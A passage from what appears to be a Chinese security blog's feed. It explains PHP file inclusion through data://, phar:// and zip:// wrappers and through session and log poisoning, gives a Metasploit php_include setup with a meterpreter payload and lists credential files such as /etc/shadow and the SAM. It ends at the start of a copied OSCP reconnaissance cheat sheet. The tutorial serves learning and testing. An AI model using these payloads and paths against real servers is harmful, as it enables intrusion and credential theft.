variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;payload:  &lt;code&gt;http://192.168.199.130/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image026.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;phar伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phar伪协议&#34;&gt;#&lt;/a&gt; phar:// 伪协议&lt;/h2&gt;
&lt;p&gt;这个参数是就是 php 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。&lt;br /&gt;
用法：?file=phar:// 压缩包 / 内部文件 phar://xxx.png/shell.php。&lt;br /&gt;
注意： PHP &amp;gt; =5.3.0 压缩包需要是 zip 协议压缩，rar 不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。&lt;br /&gt;
步骤： 写一个一句话木马文件 shell.php，然后用 zip 协议压缩为 shell.zip，然后将后缀改为 png 等其他格式。&lt;/p&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;没有实验完成，先挖个坑。&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;zip伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#zip伪协议&#34;&gt;#&lt;/a&gt; zip:// 伪协议&lt;/h2&gt;
&lt;p&gt;zip 伪协议和 phar 协议类似，但是用法不一样。&lt;br /&gt;
用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。&lt;br /&gt;
条件： PHP &amp;gt; =5.3.0，注意在 windows 下测试要 5.3.0&amp;lt;PHP&amp;lt;5.4 才可以 #在浏览器中要编码为 %23，否则浏览器默认不会传输特殊字符。&lt;/p&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;没有实验完成，先挖个坑。&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;封装协议摘要&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#封装协议摘要&#34;&gt;#&lt;/a&gt; 封装协议摘要&lt;/h2&gt;
&lt;table&gt;
    &lt;tr&gt;
        &lt;th&gt;属性&lt;/th&gt;
        &lt;th&gt;支持&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;受限于 allow_url_include&lt;/td&gt;
        &lt;td&gt;仅 &lt;em&gt;php://input&lt;/em&gt;、 &lt;em&gt;php://stdin&lt;/em&gt;、 &lt;em&gt;php://memory&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;允许读取&lt;/td&gt;
        &lt;td&gt;仅 &lt;em&gt;php://stdin&lt;/em&gt;、 &lt;em&gt;php://input&lt;/em&gt;、 &lt;em&gt;php://fd&lt;/em&gt;、 &lt;em&gt;php://memory&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;。
        &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;允许写入&lt;/td&gt;
        &lt;td&gt;仅 &lt;em&gt;php://stdout&lt;/em&gt;、 &lt;em&gt;php://stderr&lt;/em&gt;、 &lt;em&gt;php://output&lt;/em&gt;、 &lt;em&gt;php://fd&lt;/em&gt;、
            &lt;em&gt;php://memory&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;。
        &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;允许追加&lt;/td&gt;
        &lt;td&gt;仅 &lt;em&gt;php://stdout&lt;/em&gt;、 &lt;em&gt;php://stderr&lt;/em&gt;、 &lt;em&gt;php://output&lt;/em&gt;、 &lt;em&gt;php://fd&lt;/em&gt;、
            &lt;em&gt;php://memory&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;（等于写入）
        &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;允许同时读写&lt;/td&gt;
        &lt;td&gt;仅 &lt;em&gt;php://fd&lt;/em&gt;、 &lt;em&gt;php://memory&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;支持 stat()&lt;/td&gt;
        &lt;td&gt;仅 &lt;em&gt;php://memory&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;仅仅支持 stream_select()&lt;/td&gt;
        &lt;td&gt;&lt;em&gt;php://stdin&lt;/em&gt;、 &lt;em&gt;php://stdout&lt;/em&gt;、 &lt;em&gt;php://stderr&lt;/em&gt;、 &lt;em&gt;php://fd&lt;/em&gt; 和 &lt;em&gt;php://temp&lt;/em&gt;。
        &lt;/td&gt;
    &lt;/tr&gt;
&lt;/table&gt;
&lt;h1 id=&#34;文件包含姿势&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含姿势&#34;&gt;#&lt;/a&gt; 文件包含姿势&lt;/h1&gt;
&lt;h2 id=&#34;文件包含session&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含session&#34;&gt;#&lt;/a&gt; 文件包含 session&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;利用条件：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;session 的存储位置可以获取。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 phpinfo 的信息可以获取到 session 的存储位置。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过 phpinfo 的信息，获取到 session.save_path 为 /var/lib/php5/：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;另一种只能猜测了&lt;br /&gt;
根据各版本的中间件猜测。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;session 中的内容可以被控制，传入恶意代码。&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;span&gt;示例代码&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$s&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;str&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;s&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;漏洞分析&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;此 php 会将获取到的 GET 型 ctfs 变量的值存入到 session 中。&lt;/p&gt;
&lt;p&gt;当访问 http://www.xxx.com/x.php?str=666 后，会在 /var/lib/php5 目录下存储 session 的值。&lt;/p&gt;
&lt;p&gt;session 的文件名为 sess_+sessionid，sessionid 可以通过开发者模式获取。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;所以 session 的文件名为 sess_88565500f4af7f5e934c59c0ba643a60&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image005.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;到服务器的 /var/lib/php/session 目录下查看果然存在此文件，内容为：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image004.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;可以看到 666 已经存里面了&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;漏洞利用&lt;/span&gt;&lt;br /&gt;
通过上面的分析，可以知道 str 传入的值会存储到 session 文件中，如果存在本地文件包含漏洞，就可以通过 str 写入恶意代码到 session 文件中，然后通过文件包含漏洞执行此恶意代码 getshell。&lt;/p&gt;
&lt;p&gt;当访问 http://www.xxx.com/x.php?str=&amp;lt;?php phpinfo ();?&amp;gt; 后，会在 /var/lib/php5 目录下存储 session 的值。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image006.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;结果&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image007.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;文件包含日志&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含日志&#34;&gt;#&lt;/a&gt; 文件包含日志&lt;/h2&gt;
&lt;p&gt;利用条件：需要知道服务器日志的存储路径，且日志文件可读。&lt;/p&gt;
&lt;p&gt;很多时候，web 服务器会将请求写入到日志文件中，比如说 apache。在用户发起请求时，会将请求写入 access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label danger&#34;&gt;💔必须要更改数据包的访问请求才行，不然在日志文件里会被转码。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;示例&lt;/span&gt;&lt;br /&gt;
&lt;img data-src=&#34;image014.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️还可以在 User-Agent 里插入 payload&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image015.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label danger&#34;&gt;💔有的日志文件里不一定会显示 UA 信息&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;label info&#34;&gt;示例&lt;/span&gt;&lt;br /&gt;
&lt;img data-src=&#34;image017.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
这是因为 Apache 配置&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image016.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;详情见：&lt;a href=&#34;https://self-ferry.github.io/2021/01/22/apache%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E8%AF%A6%E8%A7%A3%E3%80%90%E8%BD%AC%E3%80%91/&#34;&gt;https://self-ferry.github.io/2021/01/22/apache 访问日志详解【转】/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;msf-攻击模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf-攻击模块&#34;&gt;#&lt;/a&gt; MSF 攻击模块&lt;/h2&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;举个例子&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit/unix/webapp/php_include&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; rhost &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.199.12&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; rport &lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; phpuri /index.php?file&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;xxLFIxx&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; path http://192.168.199.147/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload php/meterpreter/bind_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; srvport &lt;span class=&#34;token number&#34;&gt;8888&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exploit -z&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;常见的敏感信息路径&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的敏感信息路径&#34;&gt;#&lt;/a&gt; 常见的敏感信息路径&lt;/h1&gt;
&lt;h2 id=&#34;windows系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows系统&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label info&#34;&gt;Windows 系统&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;c:\boot.ini// 查看系统版本&lt;/p&gt;
&lt;p&gt;c:\windows\system32\inetsrv\MetaBase.xml// IIS 配置文件&lt;/p&gt;
&lt;p&gt;c:\windows\repair\sam // 存储 Windows 系统初次安装的密码&lt;/p&gt;
&lt;p&gt;c:\ProgramFiles\mysql\my.ini// MySQL 配置&lt;/p&gt;
&lt;p&gt;c:\ProgramFiles\mysql\data\mysql\user.MYD// MySQL root 密码&lt;/p&gt;
&lt;p&gt;c:\windows\php.ini//php 配置信息&lt;/p&gt;
&lt;h2 id=&#34;linuxunix系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linuxunix系统&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label info&#34;&gt;Linux/Unix 系统&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;/etc/passwd// 账户信息&lt;/p&gt;
&lt;p&gt;/etc/shadow// 账户密码文件&lt;/p&gt;
&lt;p&gt;/usr/local/app/apache2/conf/httpd.conf// Apache2 默认配置文件&lt;/p&gt;
&lt;p&gt;/usr/local/app/apache2/conf/extra/httpd-vhost.conf// 虚拟网站配置&lt;/p&gt;
&lt;p&gt;/usr/local/app/php5/lib/php.ini// PHP 相关配置&lt;/p&gt;
&lt;p&gt;/etc/httpd/conf/httpd.conf// Apache 配置文件&lt;/p&gt;
&lt;p&gt;/etc/my.conf//mysql 配置文件&lt;/p&gt;
&lt;h2 id=&#34;日志默认路径&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志默认路径&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label info&#34;&gt;日志默认路径&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;apache+Linux 日志默认路径&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/etc/httpd/logs/access_log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/var/log/httpd/access log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;apache+win2003 日志默认路径&lt;/p&gt;
&lt;p&gt;&lt;code&gt;D:/xampp/apache/logs/access.log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;D:/xampp/apache/logs/error.log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;IIS6.0+win2003 默认日志文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;C:/WINDOWS/system32/Logfiles&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;IIS7.0+win2003 默认日志文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;%SystemDrive%/inetpub/logs/LogFiles&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;nginx 日志文件在用户安装目录的 logs 目录下&lt;/p&gt;
&lt;p&gt;如安装目录为 /usr/local/nginx, 则日志目录就是在&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/usr/local/nginx/logs&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;也可通过其配置文件 Nginx.conf，获取到日志的存在路径&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/opt/nginx/logs/access.log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;web 中间件默认配置&lt;/p&gt;
&lt;p&gt;apache+linux 默认配置文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/etc/httpd/conf/httpd.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者&lt;/p&gt;
&lt;p&gt;&lt;code&gt;index.php?page=/etc/init.d/httpd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;IIS6.0+win2003 配置文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;C:/Windows/system32/inetsrv/metabase.xml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;IIS7.0+WIN 配置文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;C:/Windows/System32/inetsrv/config/application/Host.config&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;文件包含漏洞的防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含漏洞的防御&#34;&gt;#&lt;/a&gt; 文件包含漏洞的防御&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;PHP 中使用 open_basedir 配置限制访问在指定的区域&lt;/li&gt;
&lt;li&gt;过滤.（点）/（反斜杠）\（反斜杠）&lt;/li&gt;
&lt;li&gt;禁止服务器远程文件包含&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;参考&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考&#34;&gt;#&lt;/a&gt; 参考&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4MjI4MC5odG1s&#34;&gt;https://www.freebuf.com/articles/web/182280.html&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGhwLmNuL3RvdXRpYW8tNDE0NzkwLmh0bWw=&#34;&gt;https://www.php.cn/toutiao-414790.html&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDY=&#34;&gt;https://blog.csdn.net/ni9htmar3/article/details/69812306&lt;/span&gt;&lt;/p&gt;
</content>
        <category term="web安全" scheme="https://self-ferry.github.io/categories/web-security/" />
        <category term="文件包含" scheme="https://self-ferry.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" />
        <updated>2021-01-20T04:12:47.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/01/18/redteam-notebook/</id>
        <title>redteam-notebook【转】</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/01/18/redteam-notebook/"/>
        <content type="html">&lt;h1 id=&#34;redteam-notebook&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#redteam-notebook&#34;&gt;#&lt;/a&gt; redteam-notebook&lt;/h1&gt;
&lt;p&gt;Collection of commands, tips and tricks and references I found useful during preparation for OSCP exam.&lt;/p&gt;
&lt;h2 id=&#34;early-enumeration-generic&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#early-enumeration-generic&#34;&gt;#&lt;/a&gt; Early Enumeration - generic&lt;/h2&gt;
&lt;h3 id=&#34;network-wide-scan-first-steps&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#network-wide-scan-first-steps&#34;&gt;#&lt;/a&gt; Network wide scan - first steps&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nmap -sn 10.11.1.0/24&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;netbios-scan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#netbios-scan&#34;&gt;#&lt;/a&gt; netbios scan&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nbtscan -r 10.11.1.0/24&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;dns-recon&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-recon&#34;&gt;#&lt;/a&gt; DNS recon&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;dnsrecon -r 10.11.1.0/24 -n &amp;lt;DNS IP&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;scan-specific-target-with-nmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#scan-specific-target-with-nmap&#34;&gt;#&lt;/a&gt; Scan specific target with nmap&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nmap -sV -sT -p- &amp;lt;target IP&amp;gt; &lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;guess-os-using-xprobe2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#guess-os-using-xprobe2&#34;&gt;#&lt;/a&gt; Guess OS using xprobe2&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;xprobe2 &amp;lt;target IP&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;check-netbios-vulns&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#check-netbios-vulns&#34;&gt;#&lt;/a&gt; Check Netbios vulns&lt;/h3&gt;
